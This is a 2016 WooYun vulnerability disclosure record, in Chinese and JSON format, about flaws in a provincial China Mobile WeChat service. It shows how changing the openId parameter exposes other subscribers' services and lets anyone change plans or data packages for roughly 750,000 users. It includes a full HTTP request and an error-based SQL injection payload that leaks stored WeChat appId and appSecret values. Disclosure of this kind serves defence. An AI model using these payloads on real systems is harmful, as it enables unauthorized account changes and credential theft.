{"id": 88177, "wybug_id": "wooyun-2016-0207574", "wybug_title": "某省移动设计缺陷可随意对75w用户进行套餐变更和上网流量包开通业务                                      ", "wybug_corp": "中国移动", "wybug_author": "路人甲", "wybug_date": "2016-05-11 20:10", "wybug_open_date": "2016-06-27 17:00", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "14", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-05-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-05-13：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-05-23：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-06-02：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-06-12：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-06-27：\t细节向公众公开  简要描述： 1.查询省内任意移动号码已开通业务2.操作75w用户套餐变更和上网流量包开通 详细说明：  事关两个微信公众号\n\n\n\n打开河南移动10086公众号（）进入更多服务\n\n点进去可以看到\n\n其主要的URL部分如下：\n\n\nmask 区域\n\n1.http://**.**.**/weixin/khfwController.dogoIndex&openId=oMAmUjlbJIiy4fJ7xtZ2k9NgLL-I\n\n\n\n\n\n\n打开第一个不知道是我没有绑定的原因还是别的这里面写的是别人的手机号码\n\n河南省内移动号都可以查看我的\n\n\n\n\n\n\n\n下面两个业务不太确定是否能成功反正我测试我的失败了好像业务冲突   漏洞证明：  2.操作75w用户套餐变更和上网流量包开通这个需要获取关注该微信号的openid郑州10086那个公众号打开和办理\n\n套餐变更和上网流量包均存在问题这里以上网流量包为例\n\nhttp://**.**.**.**/hkwx/addValueProductController.do?goAddValueProductList&symbol=addvalue&openId=****&accountId=gh_065a64f56fc7该openId为关注公众号的openId随便开一个吧例如五元那个\nGET /hkwx/addValueProductController.do?goAddValueProductDetail&id=402880a94959ad4f014959ae272c0001&symbol=addvalue HTTP/1.1Host: **.**.**.**Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Connection: keep-aliveProxy-Connection: keep-aliveCookie: JSESSIONID=4453F42BBC0FB439D43D5385EB20AF9BUser-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13E238 MicroMessenger/6.3.16 NetType/WIFI Language/zh_CNAccept-Language: zh-cnReferer: http://**.**.**.**/hkwx/addValueProductController.do?goAddValueProductList&symbol=addvalue&openId=用户的openId&accountId=gh_065a64f56fc7Accept-Encoding: gzip, deflate\n\n\n\n\n获取openId的方法\nhttp://**.**.**.**/hkwx/suggestionPersonController.do?goRandomPage&openId=' AND (SELECT 1573 FROM(SELECT COUNT(*),CONCAT(0x71707a6271,(SELECT (ELT(1573=1573,1))),0x71716a6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'UVyK'='UVyK\nsql注入在表weixin_accountinfo中存着微信公众号的appId和appSecret开通业务方法首先打开\nhttp://**.**.**.**/hkwx/addValueProductController.do?goAddValueProductList&symbol=addvalue&openId=***&accountId=gh_065a64f56fc7\n\n\n然后选择一个套餐\n\n然后点立即办理 确认即可\n\n\n\n大概有75w用户变更套餐操作和这个差不多\nhttp://**.**.**.**/hkwx/planController.do?goPlanIndexPage&openId=XXX&accountId=gh_065a64f56fc7\n就不演示了河南那个就不存在这样的问题\n\n需要绑定 并且需要验证码   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2016-05-13 16:54 厂商回复： CNVD未复现所述情况,已经转由CNCERT向中国移动集团公司通报,由其后续协调网站管理部门处置.  最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}